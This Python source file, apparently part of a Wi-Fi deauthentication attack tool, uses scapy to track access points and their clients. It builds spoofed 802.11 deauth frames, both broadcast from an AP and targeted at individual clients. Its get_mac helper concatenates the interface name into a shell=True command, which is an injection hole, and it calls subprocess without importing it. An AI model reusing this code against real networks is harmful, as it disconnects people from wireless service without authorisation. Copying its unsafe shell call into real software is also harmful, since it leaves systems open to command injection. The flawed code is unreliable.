from scapy.all import *
from subprocess import check_output
import fcntl
import socket
import struct

class AP:
    def __init__(self, BSSID, channel, clients):
        self.BSSID = BSSID.lower()
        self.channel = channel
        self.clients = clients

    def add_client(self, client):
        self.clients.append(client.lower())

    def build_AP_deauth_pkt(self):
        return RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=self.BSSID, addr3=self.BSSID)/Dot11Deauth()

    def build_client_deauth_pkt(self, client):
        return RadioTap()/Dot11(addr1=self.BSSID, addr2=client, addr3=client)/Dot11Deauth()


class Network():
    def __init__(self, interface_name, interface_mac, APs):
        self.interface_name = interface_name
        self.interface_mac = interface_mac
        self.APs = APs

    def set_interface_name(self, interface_name):
        self.interface_name = interface_name
        self.interface_mac = self.get_mac(interface_name)
    
    def set_interface_mac(self, interface_mac):
        self.interface_mac = interface_mac.lower()

    def add_AP(self, AP):
        self.APs.append(AP)

    def add_client(self, src_mac, dst_mac):
        n1 = self.find_AP(src_mac)
        n2 = self.find_AP(dst_mac)
        if n1 != -1:
            self.APs[n1].add_client(dst_mac)
        elif n2 != -1:
            self.APs[n2].add_client(src_mac)

    def get_AP(self, BSSID):
        i = self.find_AP(BSSID)
        if i == -1:
            return
        return self.APs[i]

    def find_AP(self, BSSID):
        i = -1
        for k in range(len(self.APs)):
            if self.APs[k].BSSID == BSSID:
                i = k
        return i

    def get_mac(self, ifacename):
        try:
            print("Retrieving MAC address of interface %s" % (ifacename))
            output = subprocess.check_output("macchanger -s " + ifacename, shell=True)
            line = str(output.decode().split("\n")[0])
            return line[line.find("   ")+3:line.find("   ")+20]
        except:
            print("Warning: Could not get interface MAC address.")